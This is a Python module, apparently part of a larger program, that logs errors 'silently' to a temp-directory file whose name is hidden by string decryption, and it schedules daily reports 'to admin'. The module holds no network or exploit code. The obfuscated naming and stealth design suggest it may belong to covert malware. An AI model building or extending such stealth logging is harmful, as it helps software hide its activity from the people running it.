"""
core/error_logger.py - Silent error logging
"""

import os
import time
import json
import traceback
from datetime import datetime
from core.obfuscation import decrypt_string

class ErrorLogger:
    """Silently logs errors for remote debugging"""

    def __init__(self):
        self.log_path = os.path.join(os.environ.get('TEMP', '.'), decrypt_string('QFcKGREqMAwuXx5RH1xIDgdfHUNneCRMNhgN'))
        self.max_entries = 50
        self.entries = []
        self.last_send = 0

    def log(self, module, error, tb=None):
        """Log an error silently"""
        try:
            entry = {
                'time': datetime.now().isoformat(),
                'module': module,
                'error': str(error)[:200],
            }
            if tb:
                entry['traceback'] = traceback.format_exc()[:500]

            self.entries.append(entry)

            if len(self.entries) > self.max_entries:
                self.entries = self.entries[-self.max_entries:]

            with open(self.log_path, 'w') as f:
                json.dump({'errors': self.entries}, f)

        except:
            pass

    def should_send(self):
        """Check if we should send logs to admin"""
        now = time.time()
        if now - self.last_send > 86400:
            self.last_send = now
            return True
        return False

    def get_logs(self):
        """Get accumulated logs"""
        try:
            if os.path.exists(self.log_path):
                with open(self.log_path, 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'errors': []}

error_logger = ErrorLogger()

def log_error(error: str, module: str = "Unknown"):
    """Helper to log an error message"""
    error_logger.log(module, error)

def log_info(message: str, module: str = "Unknown"):
    """Helper to log an info message (using same mechanism for now)"""
    error_logger.log(module, f"[INFO] {message}")
